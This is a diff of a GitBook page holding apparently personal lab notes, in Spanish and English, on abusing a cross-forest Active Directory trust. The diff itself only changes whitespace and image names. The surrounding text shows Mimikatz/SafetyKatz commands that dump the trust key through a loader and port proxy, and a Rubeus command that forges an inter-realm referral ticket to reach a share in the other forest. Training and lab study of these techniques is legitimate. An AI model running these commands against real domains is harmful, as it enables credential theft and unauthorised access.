@@ -4,13 +4,12 @@
 
 Objetivo: Con privilegios de DA en dollarcorp.moneycorp.local, acceder al share SharedwithDCorp en el DC del bosque externo eurocorp.local.
 
-Concepto clave: Esto es diferente al LO 18/19. Aquí no puedes poner SID History porque los filtros de SID entre bosques externos lo bloquean. En su lugar, forjas un inter-realm referral ticket usando la trust key entre los dos bosques\
+Concepto clave: Esto es diferente al LO 18/19. Aquí no puedes poner SID History porque los filtros de SID entre bosques externos lo bloquean. En su lugar, forjas un inter-realm referral ticket usando la trust key entre los dos bosques\
 — básicamente te haces pasar por Administrator de dollarcorp para pedir acceso a recursos explícitamente compartidos con el bosque.
 
 ***
 
 Extract the trust key
-
 
 We need the trust key for the trust between dollarcorp and eurocrop, which can be retrieved using Mimikatz or SafetyKatz.
 
@@ -38,9 +37,9 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 ```
 
-> Remember chain the IP&#x20;
+> Remember chain the IP
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```actionscript-3
 // Domain DOLLARCORP.MONEYCORP.LOCAL
@@ -129,9 +128,7 @@ The important here is DOMAIN EUROCORP.LOCAL -> \[ In ] DOLLARCORP.MONEYCORP.LOCA
 
 ## Forge a referral ticket
 
-
-
-Let’s Forge a referral ticket.&#x20;
+Let’s Forge a referral ticket.
 
 > Note that we are not injecting any SID History here as it would be filtered out. Run the below command:
 
@@ -149,7 +146,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /servic
 > * SID
 > * HASH RC4
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 Copy the base64 encoded ticket from above and use it in the following command:
 
@@ -171,4 +168,4 @@ Once the ticket is injected, we can access explicitly shared resources on `euroc
 dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
